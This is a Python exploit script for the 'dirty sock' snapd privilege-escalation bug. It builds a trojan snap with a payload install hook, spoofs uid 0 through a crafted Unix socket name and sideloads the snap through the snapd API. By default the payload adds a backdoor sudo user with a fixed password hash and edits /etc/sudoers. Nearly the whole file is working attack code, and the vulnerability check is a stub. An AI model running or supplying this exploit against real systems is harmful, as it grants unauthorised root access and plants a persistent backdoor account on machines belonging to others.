import os
import socket
import sys
import shutil
import tempfile
import argparse
import subprocess
import time


def parse_arguments():
    default_command = """#!/bin/bash
useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
usermod -aG sudo dirty_sock
echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
    """
    parser = argparse.ArgumentParser(description='[*] Build a snap that leverages the dirty sock vulnerability')
    parser.add_argument("-u", "--uid", type=int, default=0, help='userid [default=0]')
    parser.add_argument("-f", "--file", type=str, help='name of file bash script to execute as a payload')
    parser.add_argument("-c", "--command", type=str, help='command to execute')
    parser.add_argument("-s", "--skipcleanup", action="store_true",
                        help='skip cleanup of the files used to build the snap')
    args = parser.parse_args()
    if args.file is not None:
        args.payload = open(args.file, 'r').read()
    elif args.command is not None:
        args.payload = args.command
    else:
        args.payload = default_command
    return args


class SockPuppet:
    ####################################################################################################################
    # Section: Code related to building the snap which carries the payload
    # Reference: https://docs.snapcraft.io/the-snap-format/698
    ####################################################################################################################

    name = ''
    summary = ''
    description = ''
    uid = ''
    base = ''
    sock = None
    snap_location = ''
    install_contents = ''
    yaml_contents = ''

    def __init__(self, base_dir, payload, uid, name='sock-puppet', summary='empty snap', description=''):
        self.name = name
        self.summary = summary
        self.description = description
        self.uid = uid
        self.base = base_dir
        os.chmod(base_dir, 0o775)
        self.payload = payload

    def _build_yaml(self):
        SNAP_TEMPLATE = """
        name: {name}
        version: '0.1'
        summary: {summary}
        description: {description}
        architectures:
          - amd64
        confinement: devmode
        grade: devel
        """

        self.yaml_contents = SNAP_TEMPLATE.format(name=self.name, summary=self.summary, description=self.description)

    def _build_install(self):
        install_contents = ''
        if '#!/' not in self.payload:
            install_contents += '#!/bin/bash\n'
        self.install_contents += self.payload + '\n'

    def _build_directory_structure(self):
        directories = ['meta', os.path.join('meta', 'hooks'), 'snap', os.path.join('snap', 'hooks')]
        for directory in directories:
            try:
                path = os.path.join(self.base, directory)
                os.mkdir(path)
                os.chmod(path, 0o775)
            except OSError:
                print("[-] Creation of the directory %s failed" % path)
                return False
            else:
                print("[+] Successfully created the directory %s " % path)

        return True

    def _write_snap_yaml(self):
        filename = os.path.join(self.base, os.path.join('meta', 'snap.yaml'))
        f = open(filename, 'w')
        f.write(self.yaml_contents)
        f.flush()
        f.close()
        os.chmod(filename, 0o664)
        print("[+] Successfully created the file %s" % filename)

    def _write_install(self):
        filename = os.path.join(self.base, os.path.join('meta', 'hooks', 'install'))
        f = open(filename, 'w')
        f.write(self.install_contents)
        f.flush()
        f.close()
        os.chmod(filename, 0o775)
        print("[+] Successfully created the file %s" % filename)

    def _build_snap(self):
        snap_dir = tempfile.mkdtemp()
        self.snap_location = os.path.join(snap_dir, 'payload.snap')
        subprocess.check_output(['mksquashfs', self.base, self.snap_location])
        print("[+] Successfully created the snap at %s" % self.snap_location)

    ####################################################################################################################
    # Section: Code related to executing the exploit
    # Reference: Credit to Chris Moberly who discovered and responsibly disclosed it to Canonical. More details about
    #            the bug and the original POC code can be found below.
    #               - https://github.com/initstring/dirty_sock
    #               - https://initblog.com/2019/dirty-sock/
    ####################################################################################################################

    def _check_if_vulnerable(self):
        return True     # TODO: Implement

    def _create_unix_socket(self):
        dirtysock = tempfile.mktemp(suffix=';uid={};'.format(self.uid))
        print("[+] Creating dirtysock file at %s" % dirtysock)
        return dirtysock

    def _bind_unix_socket(self, dirtysock):
        print("[+] Binding socket to file")
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.bind(dirtysock)
        return sock

    def _connect_to_api(self):
        dirtysock = self._create_unix_socket()
        self.sock = self._bind_unix_socket(dirtysock)
        print("[+] Connecting to snapd API")
        self.sock.connect('/run/snapd.socket')

    def _install_snap(self):
        # Read the snap file we created into a byte array
        blob = open(self.snap_location, 'rb').read()

        # Configure the multi-part form upload boundary here:
        boundary = '------------------------f8c156143a1caf97'

        # Construct the POST payload for the /v2/snap API, per the instructions
        # here: https://github.com/snapcore/snapd/wiki/REST-API
        # This follows the 'sideloading' process.
        post_payload = '''
--------------------------f8c156143a1caf97
Content-Disposition: form-data; name="devmode"

true
--------------------------f8c156143a1caf97
Content-Disposition: form-data; name="snap"; filename="snap.snap"
Content-Type: application/octet-stream

''' + blob.decode('latin-1') + '''
--------------------------f8c156143a1caf97--'''

        # Multi-part forum uploads are weird. First, we post the headers
        # and wait for an HTTP 100 reply. THEN we can send the payload.
        http_req1 = ('POST /v2/snaps HTTP/1.1\r\n'
                     'Host: localhost\r\n'
                     'Content-Type: multipart/form-data; boundary='
                     + boundary + '\r\n'
                                  'Expect: 100-continue\r\n'
                                  'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n')

        # Send the headers to the snap API
        print("[+] Installing the payload snap")
        self.sock.sendall(http_req1.encode("utf-8"))

        # Receive the initial HTTP/1.1 100 Continue reply
        http_reply = self.sock.recv(8192).decode("utf-8")

        if 'HTTP/1.1 100 Continue' not in http_reply:
            print("[!] Error starting POST conversation, here is the reply:\n\n")
            print(http_reply)
            sys.exit()

        # Now we can send the payload
        http_req2 = post_payload
        self.sock.sendall(http_req2.encode("latin-1"))

        # Receive the data and extract the JSON
        http_reply = self.sock.recv(8192).decode("utf-8")

        # Exit on failure
        if 'status-code":202' not in http_reply:
            print("[!] Did not work, here is the API reply:\n\n")
            print(http_reply)
            sys.exit()

        # We sleep to allow the API command to complete, otherwise the install
        # may fail.
        time.sleep(5)

    def _remove_snap(self):
        post_payload = ('{"action": "remove",'
                        ' "snaps": ["%s"]}' % self.name)
        http_req = ('POST /v2/snaps HTTP/1.1\r\n'
                    'Host: localhost\r\n'
                    'Content-Type: application/json\r\n'
                    'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n'
                    + post_payload)

        # Send our payload to the snap API
        print("[+] Deleting trojan snap (and sleeping 5 seconds)...")
        self.sock.sendall(http_req.encode("utf-8"))

        # Receive the data and extract the JSON
        http_reply = self.sock.recv(8192).decode("utf-8")

        # Exit on probably-not-vulnerable
        if '"status":"Unauthorized"' in http_reply:
            print("[!] System may not be vulnerable, here is the API reply:\n\n")
            print(http_reply)
            sys.exit()

        # Exit on failure
        if 'status-code":202' not in http_reply:
            print("[!] Did not work, here is the API reply:\n\n")
            print(http_reply)
            sys.exit()

        # We sleep to allow the API command to complete, otherwise the install
        # may fail.
        time.sleep(5)

    def _cleanup(self):
        shutil.rmtree(self.base)
        shutil.rmtree(self.snap_location.replace('payload.snap', ''))

    def execute(self):
        self._build_directory_structure()       # Create the directory structure for the snap
        self._build_install()                   # Build the install hook contents
        self._build_yaml()                      # Build the yaml metadata file for the snap
        self._write_install()                   # Write the install hook contents to the proper location
        self._write_snap_yaml()                 # Write the yaml metadata file to the proper location
        self._build_snap()                      # Build the snap, which is just creating a squashfs
        self._connect_to_api()                  # Connect to the api using a dirty sock, importance here is ;uid=0; at the end of socket name
        self._remove_snap()                     # Remove the snap if it happens to be installed already
        self._install_snap()                    # Install the snap

    def remove(self):
        self._remove_snap()                     # Remove the snap since we just needed the install hook to run and don't have any actual functionality in the snap
        self._cleanup()                         # Cleanup the temporary files


if __name__ == '__main__':

    # Parse the arguments
    arguments = parse_arguments()

    # Create a directory to build our snap inside
    output_dir = tempfile.mkdtemp()

    # Create sockpuppet instance
    sockpuppet = SockPuppet(output_dir, arguments.payload, arguments.uid)

    # Execute
    sockpuppet.execute()

    # Cleanup
    input('[*] Press any key to cleanup the snap')
    sockpuppet.remove()
